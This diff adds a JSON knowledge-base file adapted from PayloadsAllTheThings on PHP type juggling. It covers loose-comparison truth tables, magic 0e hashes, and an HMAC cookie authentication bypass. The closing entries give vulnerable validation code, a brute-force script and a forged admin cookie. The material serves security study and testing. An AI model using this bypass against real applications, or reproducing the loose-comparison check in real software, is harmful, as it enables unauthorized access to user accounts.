@@ -1,0 +1,167 @@
+{
+  "category": "Type Juggling",
+  "source": "PayloadsAllTheThings/Type Juggling/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What is type juggling in PHP",
+      "language": "text",
+      "tags": ["methodology", "php", "type-juggling"],
+      "body": "PHP is a weakly typed language: it tries to guess the programmer's intent and automatically coerces variables to different types when it considers it necessary. For example, a string containing only digits can be treated as an int or a float.\n\nThis automatic coercion (type juggling) produces unexpected results, especially in comparisons using ==, which checks only equality of value (loose comparison), not equality of type AND value (strict comparison).\n\nWhere to look: any code where the attacker controls one of the compared variables - password/token/HMAC checks, authorization and authentication bypass."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "== vs === - loose and strict comparison",
+      "language": "text",
+      "tags": ["methodology", "php", "comparison"],
+      "body": "Loose comparison: == or != - both variables have \"the same value\".\nStrict comparison: === or !== - both variables have \"the same type AND the same value\".\n\nA type juggling vulnerability occurs when loose comparison (== or !=) is used instead of strict (=== or !==) in a place where the attacker controls one of the compared variables. This can force the application to return an incorrect true/false answer and lead to serious authorization and/or authentication bugs."
+    },
+    {
+      "subcategory": "Loose comparison",
+      "title": "True Statements - expressions that yield true with ==",
+      "language": "table",
+      "tags": ["loose-comparison", "php", "bypass"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Expression", "Result"],
+          "rows": [
+            ["'0010e2'   == '1e3'", "true"],
+            ["'0xABCdef' == ' 0xABCdef'", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'0xABCdef' == '     0xABCdef'", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'0x01'     == 1", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'0x1234Ab' == '1193131'", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'123'  == 123", "true"],
+            ["'123a' == 123", "true"],
+            ["'abc'  == 0", "true"],
+            ["'' == 0 == false == NULL", "true"],
+            ["'' == 0", "true"],
+            ["0  == false", "true"],
+            ["false == NULL", "true"],
+            ["NULL == ''", "true"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Loose comparison",
+      "title": "Table representing the behavior of PHP with loose comparisons (==)",
+      "language": "image",
+      "tags": ["loose-comparison", "php", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/type-juggling/table_representing_behavior_of_PHP_with_loose_type_comparisons.png",
+        "caption": "A matrix of results of the == operator in PHP for pairs of values (TRUE/FALSE, numbers, \"0e1\", \"0e99\", \"2abc\", NULL, [], {}, etc.). Pairs that yield TRUE are highlighted in gray. Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Loose comparison",
+      "title": "NULL Statements - md5/sha1 of an array return NULL",
+      "language": "table",
+      "tags": ["loose-comparison", "php", "null"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Function", "Expression", "Result"],
+          "rows": [
+            ["sha1", "var_dump(sha1([]));", "NULL"],
+            ["md5", "var_dump(md5([]));", "NULL"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Loose comparison",
+      "title": "Loose comparisons exist not only in PHP",
+      "language": "text",
+      "tags": ["loose-comparison", "reference"],
+      "body": "Loose type coercions in comparisons are found in many languages/DBMS, not just PHP. Ready-made Loose-Compare-Tables (Hakumarachi) exist for:\n\nMariaDB, MySQL, NodeJS, PHP, Perl, Postgres, Python, SQLite.\n\nRepository: github.com/Hakumarachi/Loose-Compare-Tables"
+    },
+    {
+      "subcategory": "Loose comparison",
+      "title": "PHP 8 - type juggling when comparing strings with numbers is almost dead",
+      "language": "text",
+      "tags": ["loose-comparison", "php8", "mitigation"],
+      "body": "In PHP 8 a string is no longer coerced to a number automatically (RFC \"Saner string to number comparisons\") - collisions with hashes starting with 0e and similar are finally a thing of the past.\n\nThe RFC \"Consistent type errors for internal functions\" removes bypasses of the form 0 == strcmp($_GET['username'], $password): strcmp no longer returns null with a warning, but throws a proper exception.\n\nBottom line: magic hashes and strcmp tricks work on PHP <= 7, but not on PHP 8."
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "What are magic hashes (0e...)",
+      "language": "text",
+      "tags": ["magic-hashes", "php", "md5"],
+      "body": "Magic hashes arise from a quirk of type juggling in PHP when comparing a string hash with a number. If the hash string starts with \"0e\" followed only by digits, PHP interprets it as scientific notation (0 to the power of N = 0) and in a comparison treats it as float 0.\n\nConsequence: two different passwords whose md5/sha1 both have the form 0e[digits only] will, under loose comparison of hashes (==), turn out to be \"equal\" to zero and to each other. This breaks password/token checks based on == instead of ===."
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "Table of magic hashes MD4 / MD5",
+      "language": "table",
+      "tags": ["magic-hashes", "md5", "md4"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Hash", "\"Magic\" number / string", "Magic hash", "Found by / description"],
+          "rows": [
+            ["MD4", "gH0nAdHk", "0e096229559581069251163783434175", "@spaze"],
+            ["MD4", "IiF+hTai", "00e90130237707355082822449868597", "@spaze"],
+            ["MD5", "240610708", "0e462097431906509019562988736854", "@spazef0rze"],
+            ["MD5", "QNKCDZO", "0e830400451993494058024219903391", "@spazef0rze"],
+            ["MD5", "0e1137126905", "0e291659922323405260514745084877", "@spazef0rze"],
+            ["MD5", "0e215962017", "0e291242476940776845150308577824", "@spazef0rze"],
+            ["MD5", "129581926211651571912466741651878684928", "06da5430449f8f6f23dfc1276f722738", "Raw: ?T0D??o#??'or'8.N=?"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "Table of magic hashes SHA1 / SHA-224 / SHA-256",
+      "language": "table",
+      "tags": ["magic-hashes", "sha1", "sha256"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Hash", "\"Magic\" number / string", "Magic hash", "Found by / description"],
+          "rows": [
+            ["SHA1", "10932435112", "0e07766915004133176347055865026311692244", "Michael A. Cleverly, Michele Spagnuolo & Rogdham"],
+            ["SHA-224", "10885164793773", "0e281250946775200129471613219196999537878926740638594636", "@TihanyiNorbert"],
+            ["SHA-256", "34250003024812", "0e46289032038065916139621039085883773413820991920706299695051332", "@TihanyiNorbert"],
+            ["SHA-256", "TyNOQHUS", "0e66298694359207596086558843543959518835691168370379069085300385", "@Chick3nman512"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "Magic hash collisions (PHP) - var_dump",
+      "language": "php",
+      "tags": ["magic-hashes", "php", "collision"],
+      "body": "<?php\nvar_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)\nvar_dump(md5('aabg7XSs')  == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\n?>"
+    },
+    {
+      "subcategory": "Authentication bypass (HMAC)",
+      "title": "Vulnerable code - loose comparison of HMAC from cookie",
+      "language": "php",
+      "tags": ["auth-bypass", "hmac", "php"],
+      "body": "function validate_cookie($cookie,$key){\n $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);\n if($cookie['hmac'] != $hash){ // loose comparison\n  return false;\n  \n }\n else{\n  echo \"Well done\";\n }\n}"
+    },
+    {
+      "subcategory": "Authentication bypass (HMAC)",
+      "title": "Logic of HMAC bypass via a 0e hash",
+      "language": "text",
+      "tags": ["auth-bypass", "hmac", "methodology"],
+      "body": "The vulnerability is in the loose comparison (!=) by which $cookie['hmac'] is checked against the computed $hash.\n\nIf the attacker controls $cookie['hmac'] and sets it to the string \"0\", and also gets hash_hmac to return a hash of the form \"0e\" + digits only (treated as 0), then the condition $cookie['hmac'] != $hash becomes false - the HMAC check is bypassed.\n\nWe control 3 elements of the cookie:\n• $username   - who we are impersonating, usually \"admin\"\n• $expiration - a UNIX timestamp, must be in the future\n• $hmac       - the supplied hash, \"0\"\n\nExploitation:\n1. Prepare the cookie: username = \"admin\", expiration = a future timestamp, hmac = \"0\".\n2. Brute-force $expiration until hash_hmac produces a hash starting with \"0e\" followed only by digits (a \"zero-like\" hash). This is expensive in CPU and not always feasible, but on success gives a bypass.\n3. Substitute the found expiration value into the cookie. In the example the key was assumed to be empty: $key = '';"
+    },
+    {
+      "subcategory": "Authentication bypass (HMAC)",
+      "title": "Brute-forcing expiration to a 0e hash + final cookie",
+      "language": "php",
+      "tags": ["auth-bypass", "hmac", "bruteforce"],
+      "body": "// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php\nfor($i=1424869663; $i < 1835970773; $i++ ){\n $out = hash_hmac('md5', 'admin|'.$i, '');\n if(str_starts_with($out, '0e' )){\n  if($out == 0){\n   echo \"$i - \".$out;\n   break;\n  }\n }\n}\n?>\n\n// Brute-force result: 1539805986 - 0e772967136366835494939987377058\n$cookie = [\n 'username' => 'admin',\n 'expiration' => 1539805986,\n 'hmac' => '0'\n];"
+    }
+  ]
+}
